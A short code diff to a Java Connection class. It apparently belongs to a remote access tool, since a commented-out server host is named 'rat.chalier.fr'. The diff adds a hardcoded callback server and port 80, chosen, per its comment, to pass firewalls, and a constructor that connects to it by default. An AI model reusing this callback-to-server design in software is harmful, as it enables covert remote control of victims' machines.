@@ -25,6 +25,18 @@ import java.net.UnknownHostException;
 public class Connection {
 	
 	/**
+	 * Server url.
+	 * Using a domain name to be able to change IP once compiled.
+	 */
+	// private static final String SERVER_URL = "http://rat.chalier.fr";
+	private static final String SERVER_URL = "127.0.0.1";
+	
+	/**
+	 * Server port. 80 by default, as often opened in firewalls.
+	 */
+	private static final int SERVER_PORT = 80;
+	
+	/**
 	 * Newline byte sequence.
 	 */
 	private static final byte[] CRLF = new byte[] {13, 10};
@@ -37,6 +49,11 @@ public class Connection {
 	private Socket socket;
 	private InputStream in;
 	private OutputStream out;
+	
+	public Connection()
+			throws UnknownHostException, IOException {
+		this(SERVER_URL, SERVER_PORT);
+	}
 	
 	public Connection(String url, int port)
 			throws UnknownHostException, IOException {
